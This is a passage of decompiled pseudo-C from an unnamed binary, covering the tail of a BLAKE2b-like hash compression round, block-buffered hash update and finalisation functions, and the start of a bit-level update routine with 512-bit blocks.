    v488 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v479, v480)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v487;
    v1051 = v489 ^ v594;
    v490 = v488 ^ (v486 >> 31);
    v1053 = ((unsigned int)v489 ^ (unsigned int)v594) << 8;
    LODWORD(v486) = v489 ^ v594;
    HIDWORD(v486) = v490;
    v491 = HIBYTE(v490) | v1053;
    v590 += __PAIR64__(v491, v486 >> 24) + v607;
    v1055 = v602 ^ v590;
    v1057 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v492 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v1057;
    v494 = __PAIR64__(v21, v492) + __PAIR64__(v488, v489);
    v493 = (__PAIR64__(v21, v492) + __PAIR64__(v488, v489)) >> 32;
    v602 = __PAIR64__(v21, v492);
    v495 = v494 ^ (v486 >> 24);
    HIDWORD(v486) = v493 ^ v491;
    LODWORD(v486) = v495;
    LODWORD(v594) = (2 * v495) | ((v493 ^ v491) >> 31);
    v1059 = 0;
    HIDWORD(v594) = v486 >> 31;
    v591 += v595 + v608;
    v1061 = v603 ^ v591;
    v496 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
          + __PAIR64__(HIDWORD(v599), v485)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v485;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v1063 = HIDWORD(v18) ^ v595;
    v1065 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v496, HIDWORD(v18)) ^ v595) >> 24;
    v497 = ((v496 ^ HIDWORD(v595)) >> 24) | v1065;
    v595 = __PAIR64__(v497, v21);
    v591 += __PAIR64__(v497, v21) + v609;
    v1069 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    v1067 = v603 ^ v591;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | v1069;
    v499 = ((v603 ^ v591) >> 16) + HIDWORD(v18);
    v498 = (__PAIR64__(v21, (v603 ^ v591) >> 16) + __PAIR64__(v496, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, (v603 ^ v591) >> 16);
    HIDWORD(v599) = v498;
    v500 = __PAIR64__(v498, v499) ^ v595;
    LODWORD(v595) = (2 * (v499 ^ v595)) | ((v498 ^ HIDWORD(v595)) >> 31);
    v1071 = 0;
    HIDWORD(v595) = v500 >> 31;
    v592 += v596 + v610;
    v1073 = v604 ^ v592;
    v501 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), v468)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v468;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v1075 = HIDWORD(v21) ^ v596;
    v1077 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v596) = (__PAIR64__(v501, HIDWORD(v21)) ^ v596) >> 24;
    HIDWORD(v596) = ((v501 ^ HIDWORD(v596)) >> 24) | v1077;
    v592 += v596 + v611;
    v1079 = v604 ^ v592;
    v1081 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v1081;
    v503 = ((v604 ^ v592) >> 16) + HIDWORD(v21);
    v502 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v501, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v502;
    v504 = __PAIR64__(v502, v503) ^ v596;
    LODWORD(v596) = (2 * (v503 ^ v596)) | ((v502 ^ HIDWORD(v596)) >> 31);
    v1083 = 0;
    HIDWORD(v596) = v504 >> 31;
    v593 += v597 + v612;
    v505 = HIDWORD(v605) ^ HIDWORD(v593);
    v1085 = v605 ^ v593;
    v506 = (HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v601) = (__PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601) >> 32;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v601) = v506;
    v1087 = v506 ^ v597;
    v1089 = (v506 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v601), v506) ^ v597) >> 24;
    LODWORD(v597) = v21;
    v507 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1089, v21) + v613;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1089;
    v593 += v507;
    v508 = v505 ^ v593;
    v1091 = v508;
    v1093 = v508 << 16;
    v509 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v508) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v508 << 16);
    v601 += __PAIR64__(v21, v509);
    v510 = v601 ^ v597;
    LODWORD(v597) = (2 * (v601 ^ v597)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 31);
    v1095 = 0;
    HIDWORD(v597) = v510 >> 31;
    v590 += v595 + v614;
    v511 = v21 ^ HIDWORD(v590);
    v1097 = v509 ^ v590;
    HIDWORD(v605) = v509 ^ v590;
    v512 = (__PAIR64__(HIDWORD(v600), (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(v509 ^ (unsigned int)v590, v503)) >> 32;
    HIDWORD(v21) = (v21 ^ HIDWORD(v590)) + v503;
    v1099 = HIDWORD(v21) ^ v595;
    v1101 = v1099 << 8;
    LODWORD(v21) = (__PAIR64__(v512, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v512 ^ HIDWORD(v595)) >> 24) | v1101;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v615;
    v513 = v511 ^ v590;
    v1103 = v513;
    v1105 = v513 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | (v513 << 16);
    v515 = (__PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v513) >> 16) + HIDWORD(v21);
    v514 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v513) >> 16) + __PAIR64__(v512, HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v513) >> 16);
    HIDWORD(v600) = v514;
    v516 = __PAIR64__(v514, v515) ^ v595;
    LODWORD(v595) = (2 * (v515 ^ v595)) | ((v514 ^ HIDWORD(v595)) >> 31);
    v1107 = 0;
    HIDWORD(v595) = v516 >> 31;
    v591 += v596 + v616;
    v517 = HIDWORD(v602) ^ HIDWORD(v591);
    v1109 = v602 ^ v591;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v517 + v601) ^ v596;
    v601 += __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, v517);
    v1111 = v21;
    v1113 = (_DWORD)v21 << 8;
    LODWORD(v516) = v21;
    HIDWORD(v516) = HIDWORD(v601) ^ HIDWORD(v596);
    LODWORD(v596) = v516 >> 24;
    v518 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8), v596) + v617;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v518;
    v519 = v517 ^ v591;
    v1115 = v519;
    v1117 = v519 << 16;
    v520 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v519) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v519 << 16);
    v602 = __PAIR64__(v21, v520);
    v601 += __PAIR64__(v21, v520);
    v521 = v601 ^ v596;
    v1119 = 0;
    LODWORD(v596) = (2 * (v601 ^ v596)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 31);
    HIDWORD(v596) = v521 >> 31;
    v592 += v597 + v618;
    v1121 = v603 ^ v592;
    v523 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v493, v494);
    v522 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v493, v494)) >> 32;
    v1123 = v523 ^ v597;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592));
    v1125 = ((unsigned int)v523 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v522, v523) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v522 ^ HIDWORD(v597)) >> 24) | v1125;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v619;
    v1127 = v603 ^ v592;
    v1129 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v524 = (v603 ^ v592) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v1129;
    v526 = __PAIR64__(v21, v524) + __PAIR64__(v522, v523);
    v525 = (__PAIR64__(v21, v524) + __PAIR64__(v522, v523)) >> 32;
    v603 = __PAIR64__(v21, v524);
    v1131 = 0;
    v597 = (2 * (__PAIR64__(v525, v526) ^ v597)) | ((v525 ^ HIDWORD(v597)) >> 31);
    v593 += v594 + v620;
    v1133 = v604 ^ v593;
    v527 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v499)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v499;
    HIDWORD(v599) = v527;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    v1135 = HIDWORD(v18) ^ v594;
    v1137 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v527, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v527 ^ HIDWORD(v594)) >> 24) | v1137;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v621;
    v1141 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    v1139 = v604 ^ v593;
    v528 = (v604 ^ v593) >> 16;
    v529 = v528;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1141;
    v531 = v528 + HIDWORD(v18);
    v530 = (__PAIR64__(v21, v528) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, v529);
    HIDWORD(v599) = v530;
    v532 = v530 ^ HIDWORD(v594);
    v533 = (__PAIR64__(v530, v531) ^ v594) >> 31;
    LODWORD(v594) = (2 * (v531 ^ v594)) | (v532 >> 31);
    v1143 = 0;
    LODWORD(v21) = v533;
    v1145 = (__PAIR64__(v533, v594) + v620) >> 32;
    v534 = __PAIR64__(v533, v594) + v620 + v590;
    v1147 = v602 ^ v534;
    v637 = HIDWORD(v602) ^ HIDWORD(v534);
    v535 = HIDWORD(v602) ^ HIDWORD(v534);
    v638 = 0;
    v537 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v534, HIDWORD(v602) ^ HIDWORD(v534)) + __PAIR64__(v525, v526);
    v536 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v534, HIDWORD(v602) ^ HIDWORD(v534)) + __PAIR64__(v525, v526)) >> 32;
    HIDWORD(v602) = v602 ^ v534;
    LODWORD(v602) = v535;
    v1149 = v537 ^ v594;
    v1151 = ((unsigned int)v537 ^ (unsigned int)v594) << 8;
    LODWORD(v521) = v537 ^ v594;
    HIDWORD(v521) = v536 ^ v21;
    LODWORD(v594) = v521 >> 24;
    HIDWORD(v594) = ((v536 ^ (unsigned int)v21) >> 24) | v1151;
    v590 = v594 + v616 + v534;
    v633 = (v535 ^ (unsigned int)v590) << 16;
    v538 = (unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16;
    v632 = 0;
    LODWORD(v602) = (v602 ^ v590) >> 16;
    v540 = __PAIR64__(v538 | v633, v602) + __PAIR64__(v536, v537);
    v539 = (__PAIR64__(v538 | v633, v602) + __PAIR64__(v536, v537)) >> 32;
    HIDWORD(v602) = v538 | v633;
    v541 = (2 * (v540 ^ v594)) | ((v539 ^ HIDWORD(v594)) >> 31);
    v1153 = 0;
    HIDWORD(v594) = (__PAIR64__(v539, v540) ^ v594) >> 31;
    v650 = v595 + v610;
    LODWORD(v594) = v541;
    v542 = v591;
    LODWORD(v591) = v595 + v610 + v591;
    v543 = v591;
    v647 = 0;
    v591 = v595 + v610 + __PAIR64__(HIDWORD(v591), v542);
    v1155 = v603 ^ v543;
    v646 = HIDWORD(v603) ^ HIDWORD(v591);
    v544 = v603 ^ v543;
    v545 = (__PAIR64__(HIDWORD(v599), HIDWORD(v603) ^ HIDWORD(v591)) + __PAIR64__(v544, v531)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v531;
    v1157 = HIDWORD(v18) ^ v595;
    v1159 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    HIDWORD(v599) = v545;
    v546 = __PAIR64__(v545, HIDWORD(v18)) ^ v595;
    v547 = ((v545 ^ HIDWORD(v595)) >> 24) | v1159;
    LODWORD(v595) = v546 >> 24;
    HIDWORD(v595) = v547;
    v548 = __PAIR64__(v547, v595) + v614 + v591;
    v625 = (HIDWORD(v603) ^ HIDWORD(v591) ^ (unsigned int)v548) << 16;
    LODWORD(v546) = HIDWORD(v603) ^ HIDWORD(v591) ^ v548;
    HIDWORD(v546) = v544 ^ HIDWORD(v548);
    v624 = 0;
    LODWORD(v603) = v546 >> 16;
    v549 = (__PAIR64__(HIDWORD(v599), v603) + __PAIR64__(((v544 ^ HIDWORD(v548)) >> 16) | v625, HIDWORD(v18))) >> 32;
    HIDWORD(v18) += v603;
    HIDWORD(v603) = ((v544 ^ HIDWORD(v548)) >> 16) | v625;
    HIDWORD(v599) = v549;
    v550 = __PAIR64__(v549, HIDWORD(v18)) ^ v595;
    LODWORD(v595) = (2 * (HIDWORD(v18) ^ v595)) | ((v549 ^ HIDWORD(v595)) >> 31);
    v1161 = 0;
    HIDWORD(v595) = v550 >> 31;
    v642 = v596 + v615;
    v649 = 0;
    v551 = v592;
    LODWORD(v592) = v596 + v615 + v592;
    v552 = v592;
    v592 = v596 + v615 + __PAIR64__(HIDWORD(v592), v551);
    v1163 = v604 ^ v552;
    v648 = HIDWORD(v604) ^ HIDWORD(v592);
    v553 = v604 ^ v552;
    LODWORD(v604) = HIDWORD(v604) ^ HIDWORD(v592);
    v554 = (__PAIR64__(HIDWORD(v600), HIDWORD(v604) ^ HIDWORD(v592)) + __PAIR64__(v553, v515)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v515;
    v1165 = HIDWORD(v21) ^ v596;
    v1167 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    HIDWORD(v600) = v554;
    v555 = __PAIR64__(v554, HIDWORD(v21)) ^ v596;
    v556 = ((v554 ^ HIDWORD(v596)) >> 24) | v1167;
    LODWORD(v596) = v555 >> 24;
    HIDWORD(v596) = v556;
    v592 += __PAIR64__(v556, v596) + v621;
    LODWORD(v555) = v604 ^ v592;
    HIDWORD(v555) = v553 ^ HIDWORD(v592);
    v635 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    v557 = (v553 ^ HIDWORD(v592)) >> 16;
    v634 = 0;
    HIDWORD(v604) = v557 | v635;
    v559 = (v555 >> 16) + HIDWORD(v21);
    v558 = (__PAIR64__(v557 | v635, v555 >> 16) + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    LODWORD(v604) = v555 >> 16;
    HIDWORD(v600) = v558;
    HIDWORD(v555) = v558 ^ HIDWORD(v596);
    v1169 = 0;
    HIDWORD(v596) = (__PAIR64__(v558, v559) ^ v596) >> 31;
    v645 = v597 + v619;
    LODWORD(v596) = (2 * (v559 ^ v596)) | (HIDWORD(v555) >> 31);
    v560 = v593;
    LODWORD(v593) = v597 + v619 + v593;
    v561 = v593;
    v640 = 0;
    v593 = v597 + v619 + __PAIR64__(HIDWORD(v593), v560);
    v1171 = v605 ^ v561;
    v639 = HIDWORD(v605) ^ HIDWORD(v593);
    LODWORD(v605) = HIDWORD(v605) ^ HIDWORD(v593);
    v601 += __PAIR64__(v1171, HIDWORD(v605) ^ HIDWORD(v593));
    v1173 = v601 ^ v597;
    v1175 = ((unsigned int)v601 ^ (unsigned int)v597) << 8;
    v562 = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1175;
    LODWORD(v597) = (v601 ^ v597) >> 24;
    v593 += __PAIR64__(v562, v597) + v612;
    v1177 = v605 ^ v593;
    v1179 = ((unsigned int)v605 ^ (unsigned int)v593) << 16;
    v1181 = 0;
    LODWORD(v555) = v605 ^ v593;
    HIDWORD(v555) = v1171 ^ HIDWORD(v593);
    LODWORD(v605) = v555 >> 16;
    v563 = __PAIR64__(((v1171 ^ HIDWORD(v593)) >> 16) | v1179, v605) + v601;
    HIDWORD(v605) = ((v1171 ^ HIDWORD(v593)) >> 16) | v1179;
    HIDWORD(v555) = ((v605 + v601) >> 32) ^ v562;
    LODWORD(v555) = (v605 + v601) ^ v597;
    HIDWORD(v597) = v555 >> 31;
    v641 = v595 + v607;
    LODWORD(v597) = (2 * v555) | (HIDWORD(v555) >> 31);
    v564 = v590;
    LODWORD(v590) = v595 + v607 + v590;
    v565 = v590;
    v644 = 0;
    v590 = v595 + v607 + __PAIR64__(HIDWORD(v590), v564);
    v1183 = v605 ^ v565;
    v643 = HIDWORD(v605) ^ HIDWORD(v590);
    v566 = HIDWORD(v605) ^ HIDWORD(v590);
    v567 = v605 ^ v565;
    v605 = __PAIR64__(v567, HIDWORD(v605) ^ HIDWORD(v590));
    v569 = v566 + v559;
    v568 = (__PAIR64__(HIDWORD(v600), v566) + __PAIR64__(v567, v559)) >> 32;
    v1185 = v569 ^ v595;
    v1187 = (v569 ^ (unsigned int)v595) << 8;
    v570 = __PAIR64__(v568, v569) ^ v595;
    LODWORD(v595) = (__PAIR64__(v568, v569) ^ v595) >> 24;
    LODWORD(v21) = HIBYTE(HIDWORD(v570)) | v1187;
    HIDWORD(v595) = v21;
    v1189 = (__PAIR64__(v21, v595) + v618) >> 32;
    v590 += __PAIR64__(v21, v595) + v618;
    v631 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    v630 = 0;
    v571 = (v605 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v631;
    v605 = __PAIR64__(v21, v571);
    v572 = __PAIR64__(v568, v571) + __PAIR64__(v21, v569);
    LODWORD(v21) = (v571 + v569) ^ (v570 >> 24);
    v600 = v572;
    LODWORD(v595) = (2 * v21) | ((unsigned int)(HIDWORD(v572) ^ HIDWORD(v595)) >> 31);
    HIDWORD(v595) = __PAIR64__(HIDWORD(v572) ^ HIDWORD(v595), v21) >> 31;
    v591 = v596 + v606 + v548;
    LODWORD(v21) = HIDWORD(v602) ^ HIDWORD(v591);
    v1191 = v602 ^ v591;
    HIDWORD(v21) = v602 ^ v591;
    LODWORD(v602) = HIDWORD(v602) ^ HIDWORD(v591);
    v573 = v21 + v563;
    v574 = ((HIDWORD(v602) ^ HIDWORD(v591)) + v563) ^ v596;
    HIDWORD(v602) = HIDWORD(v21);
    v575 = ((v21 + v563) >> 32) ^ HIDWORD(v596);
    LODWORD(v21) = __PAIR64__(v575, v574) >> 24;
    HIDWORD(v21) = HIBYTE(v575) | (v574 << 8);
    LODWORD(v596) = v21;
    v591 += v21 + v608;
    v627 = ((unsigned int)v602 ^ (unsigned int)v591) << 16;
    v626 = 0;
    v576 = (v602 ^ v591) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | v627;
    v602 = __PAIR64__(v21, v576);
    HIDWORD(v570) = ((__PAIR64__(v21, v576) + v573) >> 32) ^ HIDWORD(v21);
    LODWORD(v570) = (v576 + v573) ^ v596;
    v601 = __PAIR64__(v21, v576) + v573;
    LODWORD(v596) = (2 * (v601 ^ v596)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v21)) >> 31);
    HIDWORD(v596) = v570 >> 31;
    v592 += v597 + v617;
    LODWORD(v21) = HIDWORD(v603) ^ HIDWORD(v592);
    v1193 = v603 ^ v592;
    HIDWORD(v21) = v603 ^ v592;
    v578 = v21 + __PAIR64__(v539, v540);
    v577 = (v21 + __PAIR64__(v539, v540)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    LODWORD(v603) = v21;
    LODWORD(v21) = (__PAIR64__(v577, v578) ^ v597) >> 24;
    HIDWORD(v21) = ((v577 ^ HIDWORD(v597)) >> 24) | (((unsigned int)v578 ^ (unsigned int)v597) << 8);
    LODWORD(v597) = v21;
    v592 += v21 + v613;
    v629 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v628 = 0;
    v579 = (v603 ^ v592) >> 16;
    v581 = __PAIR64__(((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v629, v579) + __PAIR64__(v577, v578);
    v580 = (__PAIR64__(((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v629, v579) + __PAIR64__(v577, v578)) >> 32;
    HIDWORD(v21) ^= v580;
    v598 = __PAIR64__(v580, v581);
    HIDWORD(v603) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v629;
    LODWORD(v21) = v581 ^ v21;
    LODWORD(v597) = (2 * (v581 ^ v597)) | (HIDWORD(v21) >> 31);
    HIDWORD(v597) = v21 >> 31;
    LODWORD(v603) = v579;
    v1195 = v604 ^ (v594 + v611 + v593);
    LODWORD(v604) = HIDWORD(v604) ^ ((v594 + v611 + v593) >> 32);
    v582 = (__PAIR64__(HIDWORD(v599), v604) + __PAIR64__(v1195, HIDWORD(v18))) >> 32;
    HIDWORD(v18) += v604;
    HIDWORD(v604) = v1195;
    LODWORD(v570) = HIDWORD(v18) ^ v594;
    HIDWORD(v570) = v582 ^ HIDWORD(v594);
    HIDWORD(v599) = v582;
    LODWORD(v18) = ((v582 ^ HIDWORD(v594)) >> 24) | ((HIDWORD(v18) ^ (unsigned int)v594) << 8);
    v583 = v570 >> 24;
    v593 += __PAIR64__(v18, v583) + v609 + v594 + v611;
    v584 = ((unsigned int)((v604 ^ v593) >> 32) >> 16) | (((unsigned int)v604 ^ (unsigned int)v593) << 16);
    v585 = (((v604 ^ v593) >> 16) + HIDWORD(v18)) ^ v583;
    v599 = __PAIR64__(v584, (v604 ^ v593) >> 16) + __PAIR64__(HIDWORD(v599), HIDWORD(v18));
    HIDWORD(v18) = HIDWORD(v599) ^ v18;
    HIDWORD(v570) = HIDWORD(v599) ^ v18;
    LODWORD(v570) = v585;
    result = a1;
    LODWORD(v604) = (v604 ^ v593) >> 16;
    HIDWORD(v604) = v584;
    LODWORD(v594) = __SPAIR64__(v585, HIDWORD(v18)) >> 31;
    HIDWORD(v594) = v570 >> 31;
    for ( i = 0; i < 8; ++i )
    {
      v587 = a1[2 * i] ^ *((_DWORD *)&v590 + 2 * i) ^ *((_DWORD *)&v598 + 2 * i);
      v588 = a1[2 * i + 1] ^ *((_DWORD *)&v590 + 2 * i + 1) ^ *((_DWORD *)&v598 + 2 * i + 1);
      *((_DWORD *)&v590 + 2 * i) = v587;
      a1[2 * i] = v587;
      *((_DWORD *)&v590 + 2 * i + 1) = v588;
      a1[2 * i + 1] = v588;
    }
    v4 = v622 + a2;
    v12 = a3 == v622;
    a3 -= v622;
    a2 += v622;
    if ( v12 )
      break;
    v7 = HIDWORD(v594);
    v6 = v594;
    v5 = v590;
  }
  return result;
}

//----- (004C6880) --------------------------------------------------------
int __cdecl sub_4C6880(unsigned int *a1, char *Src, size_t Size)
{
  size_t v3; // ebx
  char *v4; // ebp
  unsigned int v5; // eax
  unsigned int v6; // edi
  int v7; // edi
  unsigned int v8; // ebx

  v3 = Size;
  v4 = Src;
  v5 = a1[56];
  v6 = 128 - v5;
  if ( Size > 128 - v5 )
  {
    if ( v5 )
    {
      memcpy((char *)a1 + v5 + 96, Src, 128 - v5);
      sub_4BE330(a1, (int)(a1 + 24), 0x80u);
      v4 = &Src[v6];
      a1[56] = 0;
      v3 = Size - v6;
    }
    if ( v3 > 0x80 )
    {
      v7 = v3 & 0x7F;
      if ( (v3 & 0x7F) == 0 )
        v7 = 128;
      v8 = v3 - v7;
      sub_4BE330(a1, (int)v4, v8);
      v4 += v8;
      v3 = v7;
    }
  }
  memcpy((char *)a1 + a1[56] + 96, v4, v3);
  a1[56] += v3;
  return 1;
}

//----- (004C6920) --------------------------------------------------------
int __cdecl sub_4C6920(_DWORD *a1, unsigned int *a2)
{
  _DWORD *v2; // eax
  char *v3; // ecx
  int v4; // edx

  a2[20] = -1;
  a2[21] = -1;
  memset((char *)a2 + a2[56] + 96, 0, 128 - a2[56]);
  sub_4BE330(a2, (int)(a2 + 24), a2[56]);
  v2 = a1;
  v3 = (char *)((char *)a2 - (char *)a1);
  v4 = 8;
  do
  {
    *v2 = *(_DWORD *)((char *)v2 + (_DWORD)v3);
    v2[1] = *(_DWORD *)((char *)v2 + (_DWORD)v3 + 4);
    v2 += 2;
    --v4;
  }
  while ( v4 );
  sub_4139E0(a2, 0xE8u);
  return 1;
}

//----- (004C69C0) --------------------------------------------------------
__m64 *__cdecl sub_4C69C0(__m64 *a1, __m64 *Src, unsigned int a3)
{
  unsigned int v3; // ecx
  __m64 *v4; // ebp
  __m64 *result; // eax
  unsigned int v7; // edi
  int v8; // ebx
  int v9; // edx
  unsigned int v11; // eax
  char v12; // bl
  char v13; // dl
  __m64 *v14; // ebp
  unsigned __int8 v15; // bl
  unsigned __int8 v16; // bl
  __m64 *v17; // ebp
  unsigned int v18; // ebx
  unsigned int v19; // ebx
  unsigned int v20; // eax
  unsigned int v21; // ecx
  size_t v22; // ebx
  int v23; // [esp+10h] [ebp-Ch]
  int v24; // [esp+14h] [ebp-8h]
  unsigned int v25; // [esp+18h] [ebp-4h]
  __m64 *i; // [esp+20h] [ebp+4h]

  v3 = a3;
  v4 = Src;
  a1[16].m64_i32[1] += a3;
  result = (__m64 *)a1[16].m64_i32[1];
  v7 = a1[16].m64_u32[0];
  v8 = v7 & 7;
  v9 = -a3 & 7;
  v23 = (unsigned __int8)v8;
  v24 = v9;
  if ( (unsigned int)result < a3 )
  {
    result = a1 + 17;
    v25 = 1;
    for ( i = a1 + 17; result->m64_i32[0]++ == -1; result = i )
    {
      ++v25;
      i = (__m64 *)((char *)i + 4);
      if ( v25 >= 8 )
        break;
    }
  }
LABEL_6:
  if ( v9 || v8 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        if ( !v3 )
          return result;
        v11 = v7 >> 3;
        if ( v8 == v9 )
        {
          v4 = (__m64 *)((char *)v4 + 1);
          Src = v4;
          a1[8].m64_i8[v11] |= v4[-1].m64_i8[7] & (255 >> v9);
          result = (__m64 *)(8 - v9);
          a3 -= 8 - v9;
          v7 += 8 - v9;
          v23 = 0;
          v24 = 0;
          if ( v7 == 512 )
          {
            result = sub_4D3980(a1, a1 + 8, 1);
            v7 = 0;
          }
          v9 = 0;
          v8 = 0;
          v3 = a3;
          a1[16].m64_i32[0] = v7;
          goto LABEL_6;
        }
        if ( v3 >= 8 )
          break;
        v16 = v4->m64_i8[0] << v9;
        v17 = a1 + 8;
        if ( v23 )
        {
          v17->m64_i8[v11] |= v16 >> v23;
          v9 = v24;
        }
        else
        {
          v17->m64_i8[v11] = v16;
        }
        v7 += a3;
        result = (__m64 *)(v11 + 1);
        if ( v7 == 512 )
        {
          sub_4D3980(a1, a1 + 8, 1);
          v9 = v24;
          result = 0;
          v7 = 0;
        }
        if ( v23 )
        {
          v9 = v24;
          v17->m64_i8[(_DWORD)result] = v16 << (8 - v23);
        }
        a3 = 0;
LABEL_26:
        v4 = Src;
        v8 = v23;
        v3 = a3;
        a1[16].m64_i32[0] = v7;
      }
      v12 = (unsigned __int8)v4->m64_i8[1] >> (8 - v9);
      v13 = v4->m64_i8[0] << v9;
      v14 = a1 + 8;
      v15 = v13 | v12;
      if ( v23 )
        v14->m64_i8[v11] |= v15 >> v23;
      else
        v14->m64_i8[v11] = v15;
      a3 -= 8;
      v7 += 8;
      result = (__m64 *)(v11 + 1);
      Src = (__m64 *)((char *)Src + 1);
      if ( v7 >= 0x200 )
      {
        sub_4D3980(a1, a1 + 8, 1);
        result = 0;
        v7 &= 0x1FFu;
      }
      v9 = v24;
      if ( !v23 )
        goto LABEL_26;
      v3 = a3;
      v14->m64_i8[(_DWORD)result] = v15 << (8 - v23);
      v4 = Src;
      v8 = v23;
      a1[16].m64_i32[0] = v7;
    }
  }
  if ( v3 )
  {
    while ( 1 )
    {
      if ( v7 || (v18 = v3 >> 9) == 0 )
      {
